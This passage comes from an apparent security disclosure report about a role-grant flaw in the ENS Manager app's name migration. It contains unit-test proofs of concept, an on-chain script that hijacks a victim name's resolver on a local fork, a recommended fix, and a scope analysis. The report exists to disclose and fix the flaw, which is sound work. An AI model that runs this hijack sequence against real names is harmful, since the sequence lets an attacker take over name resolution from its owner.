    const { classified } = classifyNames([v1Domain(BUYER)], BUYER)

    expect(classified).toHaveLength(1)
    expect(classified[0].managerAddress).toBeNull()
    expect(() => buildRoleGrantCall(classified[0])).toThrow()
  })

  /**
   * End of the construction chain: the grant is not merely constructible in
   * isolation, it is assembled into the single atomic batch the user approves.
   */
  it('places the grant to the stale controller inside the approved atomic batch', async () => {
    const { classified } = classifyNames([v1Domain(SELLER)], BUYER)
    const name = classified[0]

    const plan = await buildAtomicMigrationBatches({
      chainId: sepolia.id,
      hca: HCA,
      wallet: BUYER,
      classified: [name],
      profiles: new Map(),
      defaultResolver: DEFAULT_RESOLVER,
      resolverDeployed: false,
      walletCoAdminGranted: false,
      maxOuterGas: 1_000_000n,
      estimateOuterGas: () => 100_000n,
      directRoutes: new Map([
        [
          name.domain.name,
          {
            name: name.domain.name,
            receiver: V2_CONTRACTS.UnlockedMigrationController,
            parentDependency: null,
            expectedWrapperRegistry: null,
            receiverReadiness: 'migration-controller',
          },
        ],
      ]),
    } as never)

    const batch = plan.batches[0]
    assert(batch)

    // The batch the user signs contains a dedicated manager-role-grant phase.
    expect(
      batch.innerExecutions.map((e: { phase: string }) => e.phase),
    ).toContain('manager-role-grant')

    // Decode the outer executeByOwner and find the grantRoles call inside it.
    const { args } = decodeFunctionData({
      abi: hcaOwnerExecutionAbi,
      data: batch.outerCall.data as Hex,
    })
    const executions = (args as [readonly OwnerExecution[]])[0]

    const grants = executions
      .filter((e) => e.target === V2_CONTRACTS.ETHRegistry)
      .map((e) => decodeFunctionData({ abi: ETH_REGISTRY_V2_ABI, data: e.callData }))
      .filter((d) => d.functionName === 'grantRoles')

    expect(grants).toHaveLength(1)
    expect(grants[0].args).toEqual([
      labelToCanonicalId('alice'),
      ROLE_SET_RESOLVER,
      SELLER,
    ])
  })
})
```

#### 13.2 Tier 2 — `packages/migration/src/service/staleControllerPreflight.poc.test.ts`

```ts
/**
 * STALE-SNAPSHOT VARIANT — the grant is derived from an address that holds NO
 * v1 authority on chain at migration time.
 *
 * Scenario: the buyer bought the name AND already called reclaim(), so on chain
 *   ENSRegistry.owner(node) == BaseRegistrar.ownerOf(tokenId) == BUYER
 * and the seller controls nothing. The snapshot of the v1 subgraph the app is
 * working from is merely stale -- indexer lag, plus the app's own 5-minute
 * `staleTime` on the v1 names query -- and still reports owner.id == SELLER.
 *
 * This test proves the two halves that make that dangerous:
 *   1. `classifyNames` derives managerAddress = SELLER from the stale snapshot.
 *   2. `runEligibilityChecks` -- the ONLY on-chain verification the migration
 *      flow performs -- passes the name as fully eligible, because it reads
 *      BaseRegistrar.ownerOf / NameWrapper.getData (which correctly report the
 *      BUYER) and the v2 registry's getStatus. It never reads the v1
 *      ENSRegistry `owner(node)`, which is the field the grant comes from.
 *
 * So the stale value is never reconciled, and the app goes on to grant
 * ROLE_SET_RESOLVER to a party with no on-chain authority. That is authority
 * created by the app, not an existing relationship preserved by it.
 *
 * Positive : preflight reports ELIGIBLE, no v1-registry read occurs, and
 *            managerAddress is the SELLER.
 * Oracle   : with a fresh snapshot of the same chain state (owner.id == BUYER)
 *            managerAddress is null, so no grant is produced at all.
 */

import type { Address } from 'viem'
import { multicall } from 'viem/actions'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { classifyNames } from './classifyNames'
import { runEligibilityChecks } from './preflightChecks'
import { publicClient } from './_fixtures'

vi.mock('viem/actions', () => ({ multicall: vi.fn() }))
const multicallMock = vi.mocked(multicall)

const BUYER: Address = '0x00000000000000000000000000000000000000b0'
const SELLER: Address = '0x00000000000000000000000000000000000000a7'

/** The v2 registry reports a premigrated 2LD as RESERVED. */
const RESERVED_STATUS = 1

const v1Domain = (controller: string) =>
  ({
    id: '0x1111111111111111111111111111111111111111111111111111111111111111',
    labelName: 'alice',
    labelhash:
      '0x2222222222222222222222222222222222222222222222222222222222222222',
    name: 'alice.eth',
    resolver: null,
    // What the SNAPSHOT says. In the positive case this is stale: on chain the
    // buyer has already reclaimed and is the registry owner.
    owner: { id: controller },
    registrant: { id: BUYER },
    wrappedOwner: null,
    parent: { name: 'eth', wrappedDomain: null },
    registration: {
      expiryDate: String(Math.floor(Date.now() / 1000) + 31536000),
    },
    wrappedDomain: null,
  }) as never

/**
 * On-chain truth after the reclaim: the buyer holds the registrar NFT, and the
 * name is premigrated/reserved in the v2 registry. Routed by function name
 * because the eligibility checks run concurrently.
 */
const mockChainState = () => {
  multicallMock.mockImplementation((async (_client: unknown, args: unknown) => {
    const { contracts } = args as {
      contracts: readonly { functionName: string }[]
    }
    return contracts.map((c) =>
      c.functionName === 'getStatus'
        ? { status: 'success' as const, result: RESERVED_STATUS }
        : { status: 'success' as const, result: BUYER },
    )
  }) as never)
}

const calledFunctionNames = (): string[] =>
  multicallMock.mock.calls.flatMap((call) => {
    const { contracts } = call[1] as {
      contracts: readonly { functionName: string }[]
    }
    return contracts.map((c) => c.functionName)
  })

beforeEach(() => {
  multicallMock.mockReset()
  mockChainState()
})

describe('stale v1 controller snapshot survives preflight', () => {
  it('passes on-chain preflight while naming a manager with no on-chain authority', async () => {
    const { classified } = classifyNames([v1Domain(SELLER)], BUYER)
    expect(classified).toHaveLength(1)
    const name = classified[0]

    // 1. The grantee is taken from the stale snapshot.
    expect(name.managerAddress?.toLowerCase()).toBe(SELLER.toLowerCase())

    // 2. The only on-chain verification passes cleanly: nothing is dropped.
    const eligibility = await runEligibilityChecks(publicClient, [name], BUYER)
    expect(eligibility.eligible).toHaveLength(1)
    expect(eligibility.alreadyMigrated).toHaveLength(0)
    expect(eligibility.notPremigrated).toHaveLength(0)
    expect(eligibility.frozen).toHaveLength(0)
    expect(eligibility.failed).toHaveLength(0)

    // 3. The v1 ENS registry `owner(node)` is never read anywhere in preflight.
    const fns = calledFunctionNames()
    expect(fns.length).toBeGreaterThan(0)
    expect(fns).not.toContain('owner')
    expect(new Set(fns)).toEqual(new Set(['ownerOf', 'getStatus']))
  })

  it('oracle: a fresh snapshot of the same chain state produces no manager at all', async () => {
    const { classified } = classifyNames([v1Domain(BUYER)], BUYER)
    expect(classified).toHaveLength(1)

    const eligibility = await runEligibilityChecks(
      publicClient,
      [classified[0]],
      BUYER,
    )
    expect(eligibility.eligible).toHaveLength(1)

    // Same on-chain state, fresh snapshot -> nothing to grant.
    expect(classified[0].managerAddress).toBeNull()
  })
})
```

#### 13.3 Tier 3 — `e2e/scripts/poc-resolver-hijack.ts`

```ts
/**
 * ON-CHAIN PoC — the consequence half of the migration role-grant finding.
 *
 * The unit-level PoCs prove that `apps/manager` builds
 * `grantRoles(resource, ROLE_SET_RESOLVER, <stale v1 controller>)` into the
 * atomic batch the user signs. This script proves what that grant is worth on a
 * real chain: the grantee can unilaterally repoint the name's resolver, with no
 * further interaction from the owner.
 *
 * Runs against the repo's own local Anvil fork (`pnpm --filter @ens-apps/e2e infra:up`).
 * Nothing here touches a live network.
 *
 *   VICTIM   = the migrating owner (holds the name)
 *   ATTACKER = the address the migration grants ROLE_SET_RESOLVER to
 *              (in the reported scenario: the stale v1 registry controller,
 *               i.e. the previous owner / seller)
 *
 * Sequence:
 *   1. Register a v2 .eth name owned by VICTIM, with a known resolver.
 *   2. Read the resolver -> baseline.
 *   3. Grant ROLE_SET_RESOLVER to ATTACKER (exactly the call the migration's
 *      `manager-role-grant` phase emits).
 *   4. Assert hasRoles(resource, ROLE_SET_RESOLVER, ATTACKER) == true, which is
 *      the same assertion the app itself makes in verifyAtomicMigrationBatch.
 *   5. From ATTACKER, call setResolver to an address of the attacker's choosing.
 *   6. Read the resolver again -> now attacker-controlled.
 *
 * Usage: pnpm --filter @ens-apps/e2e exec tsx scripts/poc-resolver-hijack.ts
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import {
  grantRolesWriteParameters,
  setResolverWriteParameters,
} from '@ensdomains/ensjs/wallet/v2'
import { type Address, encodeFunctionData, parseAbi } from 'viem'
import { mnemonicToAccount } from 'viem/accounts'
import { createMakeV2Name } from '../fixtures/makeV2Name.js'
import { publicClient, walletClient } from '../helpers/anvil-client.js'

const MNEMONIC = 'test test test test test test test test test test test junk'

const ETH_REGISTRY = ensL1Contracts[supportedL1Chains.sepolia].ensRegistry
  .address as Address

const ROLE_SET_RESOLVER = 1n << 24n

const REGISTRY_ABI = parseAbi([
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function getResolver(string label) view returns (address)',
])

/** Any address the attacker controls; only its identity matters here. */
const ATTACKER_RESOLVER: Address = '0x00000000000000000000000000000000deadbeef'

const line = () => console.log('─'.repeat(70))

async function main() {
  const victim = mnemonicToAccount(MNEMONIC, { addressIndex: 1 })
  const attacker = mnemonicToAccount(MNEMONIC, { addressIndex: 2 })

  line()
  console.log('VICTIM (migrating owner):', victim.address)
  console.log('ATTACKER (stale v1 controller / seller):', attacker.address)
  console.log('Registry:', ETH_REGISTRY)
  line()

  // 1. Register a v2 name owned by the victim.
  const makeV2Name = createMakeV2Name({ otherAccount: victim })
  const name = await makeV2Name({ label: 'pocvictim', owner: 'other' })
  const label = name.replace(/\.eth$/, '')
  const resource = labelToCanonicalId(label)
  console.log(`\n[1] Registered ${name} to the victim.`)

  // 2. Baseline resolver.
  const before = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'getResolver',
    args: [label],
  })
  console.log(`[2] Resolver BEFORE: ${before}`)

  // Sanity: the attacker has no authority yet.
  const preRole = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'hasRoles',
    args: [resource, ROLE_SET_RESOLVER, attacker.address],
  })
  console.log(`[2] Attacker holds ROLE_SET_RESOLVER? ${preRole}  (expect false)`)
  if (preRole) throw new Error('attacker already had the role — bad fixture')

  // 3. The grant the migration emits.
  const grant = grantRolesWriteParameters(
    { chain: walletClient.chain, account: victim } as Parameters<
      typeof grantRolesWriteParameters
    >[0],
    {
      registryAddress: ETH_REGISTRY,
      account: attacker.address,
      resource,
      roles: ['ROLE_SET_RESOLVER'],
    },
  )
  const grantTx = await walletClient.sendTransaction({
    account: victim,
    chain: walletClient.chain,
    to: ETH_REGISTRY,
    data: encodeFunctionData({
      abi: grant.abi,
      functionName: grant.functionName,
      args: grant.args,
    } as Parameters<typeof encodeFunctionData>[0]),
  })
  await publicClient.waitForTransactionReceipt({ hash: grantTx })
  console.log(
    `[3] grantRoles(resource, ROLE_SET_RESOLVER, attacker) mined: ${grantTx}`,
  )

  // 4. The same assertion the app makes post-migration.
  const hasRole = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'hasRoles',
    args: [resource, ROLE_SET_RESOLVER, attacker.address],
  })
  console.log(`[4] hasRoles(...) == ${hasRole}  (expect true)`)
  if (!hasRole) throw new Error('grant did not land')

  // 5. Attacker unilaterally repoints the resolver. No owner involvement.
  const setRes = setResolverWriteParameters(
    { chain: walletClient.chain, account: attacker } as Parameters<
      typeof setResolverWriteParameters
    >[0],
    {
      label,
      registryAddress: ETH_REGISTRY,
      resolverAddress: ATTACKER_RESOLVER,
    },
  )
  const hijackTx = await walletClient.sendTransaction({
    account: attacker,
    chain: walletClient.chain,
    to: ETH_REGISTRY,
    data: encodeFunctionData({
      abi: setRes.abi,
      functionName: setRes.functionName,
      args: setRes.args,
    } as Parameters<typeof encodeFunctionData>[0]),
  })
  await publicClient.waitForTransactionReceipt({ hash: hijackTx })
  console.log(`[5] ATTACKER called setResolver: ${hijackTx}`)

  // 6. Resolution is now attacker-controlled.
  const after = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'getResolver',
    args: [label],
  })
  console.log(`[6] Resolver AFTER:  ${after}`)

  line()
  if (after.toLowerCase() !== ATTACKER_RESOLVER.toLowerCase()) {
    throw new Error(`resolver not hijacked: ${after}`)
  }
  console.log('RESULT: the name still belongs to the victim, but its resolver')
  console.log('is now the attacker-chosen contract. Resolution of this name is')
  console.log('under the attacker’s control, with no owner interaction.')
  line()
}

main().catch((e) => {
  console.error('FAILED:', e instanceof Error ? e.message : e)
  process.exit(1)
})
```

***

### 14. Recommended fix

1. **Close the verification asymmetry.** Read `ENSRegistry.owner(namehash(name))` on chain during preflight, alongside the existing `BaseRegistrar.ownerOf` / `NameWrapper.getData` multicall, and drop `managerAddress` when it does not match. The Explorer already performs exactly this read (`apps/portal/src/features/ownership/components/V1NameManagerRecord.tsx:35-91`), so the primitive exists today. This also closes Case B, since the on-chain read cannot be stale.
2. **Do not restore a manager the migrating user did not choose.** When the migrating wallet is the registrant, either omit the grant, or surface a confirmation step that **displays the address**, states plainly that it is the current v1 controller and may be a previous owner, and **defaults to not granting**.
3. **Defence in depth for the snapshot.** Pin the v1 subgraph query to a block (`block: { number_gte: … }`) or assert freshness via `_meta`, and reduce or invalidate the 5-minute `staleTime` on the v1 names query before an authority-bearing decision is made from it.

***

### 15. Known-issue check

I reviewed every entry in both parts of the published known-issues document. No entry describes this root cause. The nearest neighbours:

| Entry                                                                                                    | What it is                                                                                                                                       | Why it is not this                                                                                                                                  |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| **QA-01** — name transfers with certain role combinations break follow-up actions                        | Errors in later profile/primary-name updates after a transfer                                                                                    | A functional breakage, not a grant of authority. Different flow (transfer, not migration), different code path, different fix.                      |
| **SEC-TXM-002** — cached smart-account address used without matching the live SDK address                | The user's **own** address, in `packages/smart-account`; the entry states *“We have confirmed the missing check but not a concrete attack path”* | Different value, different package, different consequence, different fix. Applying SEC-TXM-002's fix in full leaves this finding fully exploitable. |
| **WEB-1249** — creating a subname can detach an existing child registry                                  | Presupposes a legitimate grant and asks what the subname flow then damages                                                                       | Different flow, different role, different harm.                                                                                                     |
| **WEB-1257** — cannot set primary name after parent transfer                                             | A previous owner *losing* an ability                                                                                                             | Opposite direction.                                                                                                                                 |
| **WEB-1305** — transferring roles to a V1 name hangs                                                     | A UI hang on an unsupported target                                                                                                               | No grant occurs.                                                                                                                                    |
| **WEB-390 / WEB-806** — subnames missing from the migration list / records not appearing after migration | Migration display defects                                                                                                                        | Display only; no authority assigned.                                                                                                                |
| **R3 series**                                                                                            | `packages/transaction-manager` liveness defects                                                                                                  | Different package.                                                                                                                                  |

The document's Part 2 preamble is decisive, quoted verbatim:

> *“The items in this part are **functional or UX defects, not security findings**. … However, a demonstrated **security** consequence of one of them (for example, **a role combination that grants authority it should not**, rather than merely erroring) goes beyond the known breakage and is a new finding.”*

This report is that worked example, demonstrated with three PoCs.

The document also states its audits *“focused on application source directories”* and lists coverage gaps.

***

### 16. Scope check

| Exclusion                                                                                     | Applies?                                                                                                                                                                                                                                                                                                                                     |
| --------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| *“The ENS smart contracts, subgraph/indexer, and NFT metadata service are out of scope”*      | **No.** No subgraph defect is claimed or required — in Case A the subgraph is correct, and in Case B it is merely lagging, which every indexer does. The defect is the in-scope app's decision to convert an unverified, unpinned read into an on-chain role grant, while applying a stricter standard to the very next field it reads (§6). |
| *“Impacts caused by attacks requiring access to privileged addresses”*                        | **No.** An ordinary former owner.                                                                                                                                                                                                                                                                                                            |
| *“…requiring un-prompted, in-app user actions that are not part of the normal app workflows”* | **No.** This is the normal workflow's happy path; the attacker performs no in-app action at all.                                                                                                                                                                                                                                             |
| *“Theoretical impacts without any proof or demonstration”*                                    | **No.** Three PoCs, including on-chain execution, each with a negative control or explicit assertion.                                                                                                                                                                                                                                        |
| *“UX and UI impacts that do not materially disrupt use of the platform”*                      | **No.** The outcome is an on-chain role grant that the app itself verifies on chain, and that §12.3 exercises to seize resolution.                                                                                                                                                                                                           |
| *“Impacts requiring attacks that the reporter has already exploited themselves”*              | **No.** All testing was local.                                                                                                                                                                                                                                                                                                               |

**Asset scoping.** The defective decision, its encoding, its authorization, its on-chain post-verification and the disclosure gap are all in `apps/manager`, a listed asset: `service/buildRoleGrantCalls.ts`, `service/buildAtomicMigrationBatches.ts`, `service/migrationApprovals.ts`, `service/verifyAtomicMigrationBatch.ts`, `components/*`. `@ens-apps/migration` is a first-party workspace package of this monorepo, adopted directly into the Manager's service layer, and is the provenance of the value only. It is not a third-party dependency and is not among the program's stated dependency exclusions.

***

### 17. Attachments

| File                                    | Purpose                                                         |
| --------------------------------------- | --------------------------------------------------------------- |
| `migrationManagerRoleGrant.poc.test.ts` | Tier 1 PoC (§13.1)                                              |
| `migration-role-grant-poc.patch`        | Tier 1 PoC as a `git apply`-able patch                          |
| `staleControllerPreflight.poc.test.ts`  | Tier 2 PoC (§13.2)                                              |
| `poc-resolver-hijack.ts`                | Tier 3 on-chain PoC (§13.3)                                     |
| `poc-positive.txt`                      | Tier 1 transcript — 3/3 on unmodified code                      |
| `poc-negative-control.txt`              | Tier 1 negative control, with the injected `git diff`           |
| `poc-revert-and-suite.txt`              | Tier 1 revert + 46 files / 444 tests                            |
| `poc2-stale-positive.txt`               | Tier 2 transcript — 2/2                                         |
| `poc2-stale-negative-control.txt`       | Tier 2 negative control                                         |
| `poc2-stale-revert-and-suite.txt`       | Tier 2 revert + both suites                                     |
| `poc3-onchain-resolver-hijack.txt`      | Tier 3 transcript — grant lands, attacker repoints resolver     |
| `annotated-source-excerpts.txt`         | The five sites on the grant chain, with as-shipped line numbers |

The patch applies cleanly to the audited revision and reproduces the Tier 1 test file byte-for-byte. The only repository change at any point is the addition of PoC files.

***

### 18. Summary

The Manager app takes an address from an indexer, never verifies it, never shows it to the user, and grants it authority to repoint the resolver of the user's freshly migrated name — immediately after the migration contract deliberately cleared that same authority, and while applying a stricter verification standard to the very next field it reads. In the default post-sale state that address is the person who sold the name to the user; when the snapshot is stale it is someone who holds nothing on chain at all, and the app creates their authority from nothing. On a local fork, that authority is sufficient for the grantee to seize the name's resolution in a single transaction the owner never sees.
